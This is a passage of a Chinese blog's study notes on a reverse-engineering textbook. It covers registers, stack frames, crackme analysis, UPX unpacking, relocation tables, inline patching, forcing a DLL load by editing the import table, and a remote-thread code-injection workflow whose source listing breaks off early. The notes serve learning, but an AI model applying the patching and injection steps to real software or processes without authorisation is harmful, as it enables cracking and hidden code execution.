6个）：CS，DS，SS，ES，FS，GS</p><ul><li><p>CS：代码段寄存器</p></li><li><p>SS：栈段寄存器</p></li><li><p>DS：数据段寄存器</p></li><li><p>ES：附加数据段寄存器</p></li><li><p>FS：数据段寄存器</p></li><li><p>GS：数据段寄存器</p></li></ul><p>3.程序状态与控制寄存器：ELFLAGS寄存器的每位都有意义，每位的值为0或1。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701190155792.png" alt="image-20200701190155792"></p><p>常见的三个：</p><ul><li>ZF：若运算结果为0，则其值为1，否则为0</li><li>OF：有符号整数溢出时，OF值被置为1。此外，MSB(最高有效位)改变时，其值也被设为1</li><li>CF：无符号整数溢出时，其值被置为1</li></ul><p>4.指令指针寄存器（EIP）：保存着CPU要执行指令的地址，每执行完一条指令就会通过EIP寄存器读取下一条指令。</p><hr><h2 id="第五章-栈"><a href="#第五章-栈" class="headerlink" title="第五章 栈"></a>第五章 栈</h2><p>栈：其实是一种数据结构，它按照FILO（先进后出）的原则存储数据。用于存储局部变量，传递函数参数，保存函数的返回地址。</p><p>这里拿之前在PWN学习过程中对栈学习后的图做补充。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200609114209670-1593603250485.png" alt="image-20200609114209670"></p><hr><h2 id="第六章-分析abex’-crackme-1"><a href="#第六章-分析abex’-crackme-1" class="headerlink" title="第六章 分析abex’ crackme#1"></a>第六章 分析abex’ crackme#1</h2><ul><li>使用VC++，VC，Delphi等开发工具编写的程序，除了自己编写的代码外，还有一部分启动函数由编译器添加的。但是如果使用汇编语言编写程序，汇编代码直接变为反汇编代码，main()函数直接出现在EP中。</li><li>GetDriveType()函数：获取C驱动器的类型（大部分返回的是HDD类型）。</li><li>注意调用Win32 API后，某些特定寄存器的值就会改变。</li></ul><hr><h2 id="第七章-栈帧"><a href="#第七章-栈帧" class="headerlink" title="第七章 栈帧"></a>第七章 栈帧</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>栈帧：利用EBP（栈帧指针）寄存器访问栈内的局部变量，参数，函数返回地址的手段。</p></li><li><p>函数开始时，会先通过<code>push ebp;mov ebp, esp;</code>生成与其对应的栈帧。函数结束时会通过<code>mov esp, ebp;pop ebp;（leave）</code>删除栈帧。</p></li><li><p>最新的编译器都有一个优化选项，使用该选项编译简单的函数将不会产生栈帧。</p></li></ul><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><p>函数中局部变量使用sub esp xx；开辟空间；函数结束后，参数传递使用的栈空间使用add esp xx；进行清理。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190509071.png" alt="image-20200702190509071"></p></li><li><p>在栈窗口中，点击鼠标右键，选择地址后可以选择栈相对于那个寄存器的偏移来显示，可以让栈空间更直观。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190825336.png" alt="image-20200702190825336"></p></li><li><p>对于原来以EBP表示的函数局部变量，可以通过使用快捷键<strong>alt+o</strong>，然后选择分析1，将<strong>显示函数中的局部变量与参数</strong>的选项勾上。那我们的在OD中看到的局部变量将会被表示成：LOCAL.n，参数表示成：ARG.n。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702191428951.png" alt="image-20200702191428951"></p></li><li><p>函数调用规则：cdecl：函数调用者（Caller）负责清理储存在栈中的参数。</p><p>​                          stdcall：被调用者（Callee）负责清理保存在栈中的参数。</p></li><li><p>XOR命令：异或运算，由于XOR命令比MOV EAX，0命令执行速度快，所以常用于寄存器初始化操作。</p></li></ul><hr><h2 id="第八章-abex’-crackme-2"><a href="#第八章-abex’-crackme-2" class="headerlink" title="第八章 abex’ crackme #2"></a>第八章 abex’ crackme #2</h2><p>第一次分析vb写的程序，开始很不适应，后面从对象出发还是好很多，但始终还是不如VC写的简单，还是自己能力不够。</p><h3 id="VB编写程序的介绍"><a href="#VB编写程序的介绍" class="headerlink" title="VB编写程序的介绍"></a>VB编写程序的介绍</h3><p>事件处理程序：VB主要用来编写GUI程序。由于VB程序采用windows操作系统的系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码(即我们希望调试的代码)，用户代码存在于各个事件处理程序中。</p><p>未文档化的结构体：VB中使用的各种信息以结构体形式保存在文件内部。由于微软未正式公开这种结构体信息，所以调试VB文件会难一些。</p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先调用VB引擎主函数（ThunRTMain）<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704125816635.png" alt="image-20200704125816635"></p><p>这里直接从事件处理程序开始<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141338867.png" alt="image-20200704141338867"></p><p>获取输入的name字符串<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141442295.png" alt="image-20200704141442295"></p><p>长度比较<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141501224.png" alt="image-20200704141501224"></p><p>使用name生成密码<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141533793.png" alt="image-20200704141533793"></p><p>最后，比较密码<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141550425.png" alt="image-20200704141550425"></p><p>难点：程序中处理的每个数据都是对象，调试时不易看，且程序中函数太多。</p><hr><h2 id="第九章-Process-Explorer"><a href="#第九章-Process-Explorer" class="headerlink" title="第九章 Process Explorer"></a>第九章 Process Explorer</h2><p>积累一个新工具：进程管理。</p><p>可以显示电脑中运行每个进程哦PID，CPU占有率，注册信息，终止进程。</p><hr><h2 id="第十章-函数调用约定"><a href="#第十章-函数调用约定" class="headerlink" title="第十章 函数调用约定"></a>第十章 函数调用约定</h2><p>三种主要的函数调用约定：cdecl（C语言默认调用），stdcall（使用_stdcall关键字来使用stdcall方式编译），fastcall</p><p>它们通过栈来传递参数的方式都是一样的，区别在于清理栈的过程。</p><p>cdecl：函数调用者清理压入栈的参数。在调用函数之后通过：add esp xxx;</p><p>stdcall：被调用者清理栈。如RETN 8;命令，它的含义就是：RETN+POP 8字节，返回后使esp增加指定大小。（Win 32 API 使用stdcall方式，这个方式可以获得更好的兼容性，使C语言之外的其他语言也能直接调用API）</p><p>fastcall：前2个参数会使用ECX与EDX寄存器传递参数，实现对函数的快速调用。其他与stdcall相似。</p><hr><h2 id="第十一章-视频讲座"><a href="#第十一章-视频讲座" class="headerlink" title="第十一章 视频讲座"></a>第十一章 视频讲座</h2><p>收获两点：1.查看传入一个函数的参数个数。2.neg指令与sbb指令。</p><p>1.查看传入函数参数个数：首先判断函数调用约定，再在函数调用前后查看栈情况即可。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203210059.png" alt="image-20200704203210059"></p><p>函数调用后，两次的esp只差即为使用栈空间传递参数大小。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203311197.png" alt="image-20200704203311197"></p><p>2.neg指令的操作对象是0则CF=0，否则CF=1<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203750309.png" alt="image-20200704203750309"></p><hr><h2 id="第十三章-PE文件格式"><a href="#第十三章-PE文件格式" class="headerlink" title="第十三章 PE文件格式"></a>第十三章 PE文件格式</h2><p>之前已经学习总结在另一个帖子：<strong><a href="http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/">http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</a></strong></p><hr><h2 id="第十五章-调试UPX压缩的notepad程序"><a href="#第十五章-调试UPX压缩的notepad程序" class="headerlink" title="第十五章 调试UPX压缩的notepad程序"></a>第十五章 调试UPX压缩的notepad程序</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>GetModuleHandleA()函数：获取程序的imagebase。</li></ul><ul><li>GetProcAdress()函数：从EAT中获取指定名称的API的实际地址。</li></ul><ul><li>pushad命令：将8个通用寄存器（EAX-EDI）的值保存到栈；popad是将栈中的各个值再次回复到各个寄存器。</li></ul><ul><li>在内存复制命令中，ESI指Source，EDI指Destination。调试时，同时设置ESI与EDI时就应该猜想从ESI所指缓冲区到EDI所指缓冲区的内存发生复制。</li></ul><ul><li>ctrl+f11：反复执行step into，ctrl+f12：反复执行step over（都是不显示画面）</li></ul><ul><li>脱壳后修正IAT的原因：压缩后，文件INT(记录API名称，序数)已经损坏。</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>1.从一个循环一个循环的跳出解压缩过程最后找到EP。</p><p>2.利用堆栈平衡的原理，在程序刚开始的的esp处的数据下硬件断点，F9执行，断下的地方即是解压缩完成的地方。</p><p>断点-&gt;硬件访问-&gt;字节</p><h2 id="第十六章-基址重定位表"><a href="#第十六章-基址重定位表" class="headerlink" title="第十六章 基址重定位表"></a>第十六章 基址重定位表</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>PE文件在重定位过程中用到基址重定位表。</p><p>当向进程的虚拟内存加载PE文件（EXE/DLL/SYS）时，文件会被加载到PE头的imagebase所指的地址处，若加载的是DLL(SYS)文件且在imagebase位置处已经加载了DLL(SYS)文件，那么PE装载器就会将其加载到其他未被占用的空间，这就会引起一系列重定位问题。</p><p>创建好进程，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题，但windows vista之后的版本引入了ASLR的安全机制。</p><h3 id="基址重定位表"><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h3><p>PE头的DataDirectory[5]记录了它的RVA与SIZE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAdress; <span class="comment">//一个基准地址（每个块的基址不同）</span></span><br><span class="line">    DWORD SizeOfBlock; <span class="comment">//块的大小</span></span><br><span class="line">  <span class="comment">//WORD TypeOffset][1]; 在每个块结构体后出现的word型数组。</span></span><br><span class="line">  <span class="comment">//数组中每个值加上上面基址就是硬编码在程序中的地址偏移。</span></span><br><span class="line">  <span class="comment">//数组中每个值的前4位表示：类型；后12位表示：偏移</span></span><br><span class="line">&#125;IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>以查看notepad程序的重定位表为例：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705203510640.png" alt="image-20200705203510640"></p><h3 id="程序实例分析"><a href="#程序实例分析" class="headerlink" title="程序实例分析"></a>程序实例分析</h3><p>可以看到，程序中的内存地址以硬编码形式存在，如果加载的基地址不同又不进行重定位，程序将内存地址引用错误退出。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705184742277.png" alt="image-20200705184742277"></p><blockquote><p>重定位操作的基本操作原理</p><p><strong>在应用程序中查找硬编码的地址位置</strong></p><p><strong>读取值后，减去imagebase（VA-&gt;RVA）</strong></p><p><strong>加上实际加载的地址（RVA-&gt;VA）</strong></p></blockquote><p>找到第一个硬编码位置：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204042726.png" alt="image-20200705204042726"></p><p>加载OD，查看指定RVA:<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204651976-1600246974741.png" alt="image-20200705204651976"></p><p>这里经过的过程：（1）由于imagebase为：<strong>1000000</strong>，所以开始读到的值为：<strong>10010C4</strong>，（2）减去imagebase：<strong>10010C4-1000000 = 10C4</strong>，（3）加上实际的加载基地址：<strong>10C4+F20000 = F210C4</strong></p><p>一直重复上述过程，直到TypeOffset的值为0，则表明一个结构体块结束。对所有结构体块如此，直到遇到NULL（即最后一个结构体以NULL结束）。</p><hr><h2 id="第二十章-“内嵌补丁练习”"><a href="#第二十章-“内嵌补丁练习”" class="headerlink" title="第二十章 “内嵌补丁练习”"></a>第二十章 “内嵌补丁练习”</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>内嵌补丁：内嵌代码补丁的简称，对难以修改指定代码时，在程序中插入并运行被称为“洞穴代码”的补丁代码后对程序打补丁的技术。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>首先单步调式，很快来到2处解密代码的地方，记录好解密代码区域：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706201923481.png" alt="image-20200706201923481"></p><p>继续单步：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202406843.png" alt="image-20200706202406843"></p><p>继续：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202743840.png" alt="image-20200706202743840"></p><blockquote><p>EDX寄存器为4个字节大小，像这样向其中不断加上4个字节的值，就会发生溢出。一般的校验和计算中常常忽略该溢出问题，使用最后一个保存在EDX中的值。</p></blockquote><p>继续单步步入：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203316068.png" alt="image-20200706203316068"></p><p>最后解密完成，来到OEP：40121E<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203545470.png" alt="image-20200706203545470"></p><blockquote><p>打内嵌补丁操作：找到写入补丁代码的区域：（1）设置到文件空白区域。（2）扩展最后的节区后设置。（3）添加新节区后设置。</p></blockquote><p>这里直接找空白区域：在.txt节区的：401280开始写入代码：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706205802855.png" alt="image-20200706205802855"></p><p>最后在之前的jmp oep的地方，把oep修改为我们的内嵌补丁。但是注意：jmp oep指令也是加密了的，所以我们要写入异或过的数据。且这里要写入文件中才可以，不能是内存中。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706210952163.png" alt="image-20200706210952163"></p><p>最后，打开文件成功。</p><hr><h2 id="第二十五章-通过修改PE加载DLL"><a href="#第二十五章-通过修改PE加载DLL" class="headerlink" title="第二十五章 通过修改PE加载DLL"></a>第二十五章 通过修改PE加载DLL</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>通过“直接修改目标文件的可执行文件”，使其运行时强制加载指定的DLL文件。每当进程开始运行时就会自动加载指定的DLL文件，而<strong>加载了某DLL文件会自动执行其DLLMain。</strong></p><p>本技术关键就是对PE文件头的修改，把之前学习了PE知识应用起来（特别是IMAGE_IMPORT_DESCRIPTOP）。</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>对于要强制加载dll文件源代码就是下载一个网页的功能，本技术的关键不在这里，所以我只将我查过其中的一些函数记录下来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,   <span class="comment">//应用程序或DLL实例句柄,NULL则为获取当前程序可执行文件路径名</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR lpFilename, <span class="comment">//接收路径的字符串缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nSize        <span class="comment">//接收路径的字符缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>; <span class="comment">//函数返回当前进程已加载可执行或DLL文件的完整路径名(以'\0'终止)</span></span><br><span class="line"></span><br><span class="line">_tcsrchr("字符串"， '要查找的字符')</span><br><span class="line"><span class="comment">//返回值：指向最后一次在字符串中出现的该字符的指针，如果要查找的字符再串中没有出现，则返回NULL。</span></span><br><span class="line"></span><br><span class="line">_tcschr("字符串"， '要查找的字符')</span><br><span class="line"><span class="comment">//返回值：指向第一次在字符串中出现的该字符的指针，如果要查找的字符再串中没有出现，则返回NULL。</span></span><br></pre></td></tr></table></figure><p>由于PE文件中导入的DLL信息以结构体列表形式存储在IDT。</p><p>首先查看IDT的所占空间，找到地址，发现以NULL结尾的IID后存在其他数据。所以要添加一个IID的话，我们就要移动IDT到一个新的足够大空间，再在其尾部添加一个IID。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917221854666.png" alt="image-20200917221854666"></p><p>确定移动目标位置：(3种方式)</p><ol><li>查找文件的空白区域。</li><li>增加文件最后一个节区的大小。</li><li>在文件末尾添加新节区。</li></ol><p>首先直接查看本节区中的空白区域，发现有足够的空间，但要计算该区域中加载到进程的虚拟内存的区域，因为只有节区头明确记录的区域才会被加载。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917222618970.png" alt="image-20200917222618970"></p><p>所以还有未被使用的区域大小为：1AA，这是足够的。</p><blockquote><p>节区在磁盘文件中的大小比加载到内存的大小大的原因：</p><p><strong>文件的大小是经过文件对齐后的。</strong></p></blockquote><p>开始修改要记载指定dll的文件：</p><ol><li><p>修改导入表的RVA值及大小。（新移动的区域）</p></li><li><p>删除绑定导入表。（可有可无，提高DLL加载速度的技术）</p><p><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917223157443.png" alt="image-20200917223157443"></p></li><li><p>创建新的IDT，将原IDT复制到新区域并在尾巴添加新的IID。</p></li><li><p>设置Name，INT，IAT。（PE学习已经详细记录了，这里就就只是实操了下）。</p></li><li><p>修改IAT节区的属性值，增加可写属性。<strong>IMAGE_SCN_MEM_WRITE(80000000)</strong>。<strong>所以从40000040 -&gt; C0000040。</strong></p></li></ol><p><strong>最后本章主要是还是对PE文件熟悉了下。</strong></p><hr><h2 id="第二十七章-代码注入"><a href="#第二十七章-代码注入" class="headerlink" title="第二十七章 代码注入"></a>第二十七章 代码注入</h2><p>之前学习了DLL注入，而代码注入与之最大的区别就是只向目标进程注入要运行的代码与数据，注入完成后之后消失。原理类似。</p><p>使用dll注入优点：1.占用内存少。2.难以查找痕迹。3.不需要另外的dll文件，只要有代码注入程序即可。</p><p><strong>整个流程：</strong></p><ul><li><p>改变进程的权限进行提取。</p></li><li><p>代码注入：</p><ol><li>使用GetModuleHandleA()函数获得指定模块（kernel.dll）的句柄，为了获得要用函数的地址。</li><li>使用OpenProcess()函数获得指定PID号的进程的句柄。</li><li>设置THREAD_PARAM结构体变量并对其赋值（<strong>所要使用的函数地址，字符串</strong>），在目标进程申请内存，将该结构体写入目标进程。</li><li>计算出线程函数的大小，在目标进程申请内存，将线程函数的代码写入目标进程。</li><li>使用CreateRemoteThread()函数在目标进程创建一个远程线程（<strong>利用已经写入目标进程内存的数据</strong>）。</li></ol></li></ul><blockquote><p>tips:</p><p>Window OS中，加载到进程的kernel32.dll的地址都相同，所以我们在注入程序中获得的API(“LoadLibraryA”，“GetProcAddress”)的地址与目标程序进程中获取的同然的API的地址是相同的。因此可以直接在注入程序中获得函数的地址。</p></blockquote><p>其实整个流程也很简单，但熟练，用的好还是要多实战经历。</p><p>完整代码：（注释可以看的很清楚）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef int (FAR WINAPI *FARPROC)(); 可以在编译器中查看到。</span></span><br><span class="line"><span class="comment">//typedef _Null_terminated_ CONST CHAR *LPCSTR, *PCSTR;</span></span><br><span class="line"><span class="comment">//#define WINAPI      __stdcall</span></span><br><span class="line"><span class="comment">//typedef void far            *LPVOID;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//函数指针数组</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), 